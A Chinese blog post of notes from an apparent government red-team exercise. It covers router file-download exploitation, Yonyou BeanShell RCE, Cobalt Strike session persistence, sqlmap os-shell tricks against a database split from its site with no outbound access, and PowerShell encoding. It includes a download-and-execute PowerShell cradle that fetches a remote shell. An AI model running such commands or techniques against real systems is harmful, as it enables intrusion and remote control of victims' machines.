---
title: "某省市HW随记"
date: "2022-07-13T16:42:10+08:00"
lastmod: "2022-07-17T18:14:46+08:00"
description: "某省市HW随记前阵子去打了个小hw，遇到了一些东西，随手记一下。 1、路由器安全广撒网搜集信息的时候发现目标网段存在一个路由器登录界面 ​ 这种路由器版本一般是家用的，很少有企业会用，但是这个网段又是商业网段不可能有居民用户。所以推测这个可能是操作不规范意外暴漏的东西，于是在本地漏洞库搜索了一下找到了一个任意文件下载。下载其配置文件，获得账户密码。 进入控制台后发现有隧道代理"
url: "/2022/07/13/某省市hw随记/某省市hw随记/"
slug: "mou-sheng-shi-hw-sui-ji"
author: sshuo
source: html-legacy
commentsPath: "/2022/07/13/某省市hw随记/某省市hw随记/"
categories: ["网络安全"]
tags: ["HW", "内网渗透", "应急响应"]
---

## 某省市HW随记

前阵子去打了个小hw，遇到了一些东西，随手记一下。

![](/images/xlog/bafybeibivuypufzvc5gx4kowlqhkeeufgu4y23mtn4pqe4rgkzo7kjurkq.jpg)

### 1、路由器安全

广撒网搜集信息的时候发现目标网段存在一个路由器登录界面

![Snipaste_2022-07-14_23-58-36](/images/xlog/bafkreibtlg5yl2iqq4kolmt2yyrsf6hrwgz7yxkh6u5fsbpgflgghwepee.jpg)

​ 这种路由器版本一般是家用的，很少有企业会用，但是这个网段又是商业网段不可能有居民用户。所以推测这个可能是操作不规范意外暴漏的东西，于是在本地漏洞库搜索了一下找到了一个任意文件下载。下载其配置文件，获得账户密码。

![](/images/xlog/bafkreiaaakbo5cdvuqcen4ijakwv6bspscwhipwmhggcgrljmg3oog5qea.jpg)

进入控制台后发现有隧道代理功能。

![](/images/xlog/bafkreieebzfxaxpjqmjqmzmqz46zo66qfd3nixzhkskbbn4gmrj4lq25fu.jpg) 鼓捣了半天才搞懂这东西怎么用。配置客户端连接即可。服务端是用来类似于多个同品牌路由器组网用的。IPSec是种加密方式，不使用也是可以的。

​ 最后使用了pptp+win7系统才概率情况下连接成功。win11和mac都不能正常连接（kali也会异常）。连接完成后就等于进入了目标内网，后续不再赘述……

### 2、用友bash

##### 1、beanshell利用

​ 目标网段发现目标企业的OA系统为用友，并且存在Beanshell rce

![](/images/xlog/bafkreigs32glv32zlkz3fqyr2kwi6zrdb7mn7zyhbarjoepx42kfxuvgmy.jpg)

然而刚开始发现默认beanshell目录页面存在，但是无法执行任何命令。遂细查该漏洞的具体分析，发现在其他目录（模块）下也存在该漏洞，于是找了一份字典跑路径，从中挑选质量最佳的进行后续操作。 [字典链接](http://img.sshuo.cc/2022/%E7%94%A8%E5%8F%8Bnc%E2%80%94%E2%80%94bshell.txt)

##### 2、异常掉线

​ 成功正常访问bs rce页面后进行反弹shell操作。因为当前算是非交互shell，所以很多操作受限，该机器内也缺少各种环境存在各种问题，最后只能选择使用powershell上线cs。这里又出现了问题。每次执行cs生成的payload以后会提示上线，但是只要超过60s依然会掉线。

​ 这是因为cs默认会话是60s超时没有心跳就会判定为会话终断。那为什么好好的会话会中断呢。本质上来说我们执行命令用的“载体”是web服务。而web会话是非持久的，网页加载完成即该会话结束。而我们反弹shell的操作也是依托于web，因此当网页shell执行完毕（网页执行完毕），会话中断进程销毁，自然CS会话就掉了。而CS sleep 60s 又容易让人误以为会话存活了60s。

最终方法：依旧是使用powershell，这次修改逻辑。改为下载并执行命令

`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://xxx.com/shell')"`

​ 这个时候程序运行的逻辑就是：先下载，然后单独再起一个powershell去执行内容

当网页会话结束，系统只会销毁下载进程。单独再起的那个依然保持驻留，cs会话成功存活。

### 3、mssql注入不出网站库分离

​ 目标公众号某功能存在Mssql SQLi

​ sqlmap很顺利直接成功梭哈到os-shell。然而反弹shell的时候发现不出网，DNS也不出。继而想写一个webshell代理进去后续操作，然而翻遍了系统并未找到对应目录。推测是站库分离，写webshell计划落空。

​ *Sqlmap os-shell 小trick*

​ *1、遇到含空格的目录可以用双引号包裹 例如 cd “C:\\Program Files” 有些目录dir存在，但是cd说不存在。那么可能时因为哪里包含了空格*

​ *2、遇到中文目录时sqlmap会无法cd进去，这是因为sqlmap和windows cmd的默认编码不一致导致的。sqlmap utf-8而目标cmd为gbk。这种情况可以通过bp抓包中转修改编码。（不过太麻烦了）*

​ *3、win下用os-shell写入大量内容时剪切板中的内容需要一个个字符渲染到你自己的终端框中，极其浪费时间，并且会占用大量系统资源。我选择用配合使用超级注入工具GUI界面进行写入，节省大量时间和资源（也会产生卡顿，但比终端框好太多了）*

​ *4、使用echo等各种命令输出内容写文件会有8K限制，一次只能写入8K大小的数据，市面上大多数工具使用的写入方法均受此影响*

站库分离又不出网，这种情况真没遇到过，于是请教了好基友 [@海鸥i]()

大佬推荐我看他写的文章

[关于站库分离数据库不出网落地Exe方式探究-Mssql](https://xz.aliyun.com/t/10976)

[关于站库分离数据库不出网落地Exe方式探究-Mysql](https://xz.aliyun.com/t/10960)

[记一次无回显不出网站库分离](https://xz.aliyun.com/t/11005)

​ 用以上某种方式写入fscan之类的东西，然后所有结果都输出到一个文本，然后再通过读文本获取信息。直到横向到一个出网主机即可解脱。最后决定使用Bcp进行写文件，但是由于需要动到数据库，我认为操作比较敏感而且后续麻烦浪费时间，遂放弃深入该目标。

### 4、powershell编码

​ 在某目标使用powershell执行时发现引号斜杠之类的会影响程序正常运行导致最终传输失败。所以想用b64编码以后传，然后再解码。CS的powershell command就是这样操作的。于是随意使用了一个工具进行编码，结果发现shell命令不能正常运行。查资料以后才知道powershell的base64和平时我们使用的base64略有区别，不能直接通用。于是github找了一个转换脚本解决

[脚本链接](http://img.sshuo.cc/2022/powershell.py)

### 5、中靶虚拟机–网络架构

​ 目标网段内存在一idc主页，拿下官网后发现该机器无内网IP，网关也是一个公网IP 。ping 172/192段未发现存活，禁ping探测终于发现几个192机器，但只有25/110端口开放，很不正常。

​ 经其他师傅提示可能是个虚拟机，放大内网网段探测范围，发现多个10段，但所有存活均为路由器。继续深入的话可能只有虚拟机逃逸，但难度太大又消耗时间。

​ 继续回过头看官网系统，配置文件中发现数据库服务器、redis服务器、ros服务器账户密码及IP，但数据库和redis都存在访问白名单，只有ros服务器可以访问。但是不知道这个所谓的ros服务器是个什么东西。于是百度学习，最后发现是个路由器，并且找到一个连接工具 [链接](https://www.roszj.com/winbox)

![如图](/images/xlog/bafkreifputgxfkefs2vdw7qe7eqvyclfhm25u54xrxdeeex4fesvtj4p24.png)

大概连上去是这样的，没有太大价值。 总结：如果不是时间太多，遇到这种idc的架构建议先放一边，日后再说
